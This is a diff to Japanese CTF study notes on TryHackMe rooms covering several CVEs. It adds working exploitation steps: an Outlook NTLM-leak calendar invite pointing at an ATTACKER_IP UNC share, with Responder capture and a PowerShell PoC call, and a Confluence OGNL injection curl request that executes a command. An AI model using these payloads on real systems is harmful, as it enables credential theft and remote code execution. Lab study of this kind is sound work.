@@ -377,7 +377,7 @@ https://tryhackme.com/room/confluence202322515
 
 - Atlassian Confluence Server および Data Center `<8.3.3`, `<8.4.3`, `<8.5.2`。※`8.2.0`他も有効。
 - Confluence に完全な管理者権限を持つ追加アカウントを作成できる。
-- 事前情報不要
+- 認証情報不要
 
 XWork による getter, setter の連鎖により、
 
@@ -442,4 +442,88 @@ gcc -o exp exp.c
 
 # 実行
 ./exp
+```
+
+## CVE-2023-38408
+
+https://tryhackme.com/room/cve202338408
+
+- OpenSSH `< 9.3p2`
+- ターゲットが SSH 接続するとき、接続先のマシンが制御化にあることが必要。
+- THM の説明は環境構築に関して不明瞭な点が多く、CTF 等での再現は難しい。
+
+## CVE-2023-23397 (Outlook NTLM Leak)
+
+https://tryhackme.com/room/outlookntlmleak
+
+- Outlook デスクトップアプリ
+- 感染したメールがユーザーの受信トレイに届くだけで、攻撃者は Net-NTLMv2 認証情報ハッシュを取得できる。
+
+Outlook ではカレンダーの招待を送信するとき、リマインダー用の音声ファイルを指定できる。攻撃者はこのパラメータを利用する。
+
+攻撃者のマシンのネットワーク共有フォルダに入っている音声ファイルを、UNC 形式で指定する。（例：`\\ATTACKER_IP\foo\bar.wav`）
+
+Windows Server 以外では、ポート 445 以外を指定することができる。（FW 回避のため）
+
+```
+\\ATTACKER_IP@80\foo\bar.wav
+\\ATTACKER_IP@443\foo\bar.wav
+```
+
+### エクスプロイト
+
+前提：OutlookSpy プラグインをインストール（通常の音声ファイル選択機能では、UNC を設定できないため）
+
+1. Responder で SMB 接続を待ち受ける。
+
+```sh
+sudo responder -I tun0
+```
+
+2. Outlook で、カレンダー、新しい予定。
+3. OutlookSpy タブ、カレントアイテム。
+4. script タブで入力
+
+```
+AppointmentItem.ReminderOverrideDefault = true
+AppointmentItem.ReminderPlaySound = true
+AppointmentItem.ReminderSoundFile = "\\ATTACKER_IP\noexist\sound.wav"
+```
+
+5. Run を実行
+6. プロパティタブで設定反映を確認
+7. リマインダーの時間を 0 分などに設定して予定を保存
+
+### 自動エクスプロイト
+
+https://github.com/api0cradle/CVE-2023-23397-POC-Powershell
+
+```ps
+Import-Module .\CVE-2023-23397.ps1
+
+Send-CalendarNTLMLeak -recipient "test@thm.loc" -remotefilepath "\\ATTACKER_IP\foo\bar.wav" -meetingsubject "THM Meeting" -meetingbody "This is just a regular meeting invitation :)"
+```
+
+## CVE-2022-26134 (Atlassian)
+
+https://tryhackme.com/room/cve202226134
+
+- 認証情報不要 RCE
+- `1.3.0 -> 7.4.17`, `7.13.0 -> 7.13.7`, `7.14.0 -> 7.14.3 `, `7.15.0 -> 7.15.2 `, `7.16.0 -> 7.16.4`, `7.17.0 -> 7.17.4`, `7.18.0 -> 7.18.1 `,
+
+### エクスプロイト
+
+OGNL (Object-Graph Navigation Language) を悪用する。  
+例えば `touch /tmp/thm` を実行したい場合、下記リクエストを送る。
+
+```sh
+curl -v http://localhost:8090/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22touch%20/tmp/thm%22%29%7D/
+```
+
+#### スクリプト
+
+PoC を THM のルームから添付ファイルとしてダウンロード可能。
+
+```sh
+python ./poc.py http://10.10.84.202:8090 cat%20/flag.txt
 ```
